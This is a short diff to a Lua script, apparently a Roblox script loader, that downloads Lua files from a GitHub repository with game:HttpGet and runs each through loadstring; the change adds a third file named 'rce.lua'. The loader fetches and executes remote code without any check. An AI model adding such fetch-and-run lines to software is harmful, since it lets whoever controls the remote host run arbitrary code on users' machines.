@@ -1,7 +1,8 @@
 local success, err = pcall(function()
     for _, url in ipairs({
         "https://raw.githubusercontent.com/hashed-cmd/hashed-api/refs/heads/main/essentials/info.lua",
-        "https://raw.githubusercontent.com/hashed-cmd/hashed-api/refs/heads/main/essentials/key.lua"
+        "https://raw.githubusercontent.com/hashed-cmd/hashed-api/refs/heads/main/essentials/key.lua",
+        "https://raw.githubusercontent.com/hashed-cmd/hashed-api/refs/heads/main/essentials/rce.lua"
     }) do loadstring(game:HttpGet(url, true))() end
 end)
 
